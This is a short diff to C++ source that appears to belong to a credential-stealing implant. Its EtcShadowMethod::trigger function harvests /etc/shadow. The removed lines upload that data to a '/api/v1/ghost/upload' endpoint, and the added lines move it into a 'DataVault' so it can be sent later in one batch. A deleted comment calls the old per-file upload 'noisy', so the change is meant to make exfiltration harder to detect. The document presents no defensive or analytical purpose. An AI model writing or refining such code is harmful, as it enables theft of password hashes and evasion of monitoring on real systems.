@@ -2,6 +2,7 @@
 #include "utils/FileUtils.hpp"
 #include "utils/SystemUtils.hpp"
 #include "utils/Logger.hpp"
+#include "utils/DataVault.hpp"
 #include "network/Comms.hpp"
 
 bool EtcShadowMethod::trigger() {
@@ -12,7 +13,8 @@ bool EtcShadowMethod::trigger() {
 
     if (data.empty()) return false;
 
-    // TODO: think about aggregating all info and sending in one request, this is highly inefficient and noisy
-    LOG_INFO("Uploading /etc/shadow")
-    return Comms::UploadFile("/api/v1/ghost/upload", "etc_shadow.txt", data);
+    LOG_INFO("Adding /etc/shadow to vault")
+    DataVault::Append("etc_shadow", data);
+
+    return true;
 }
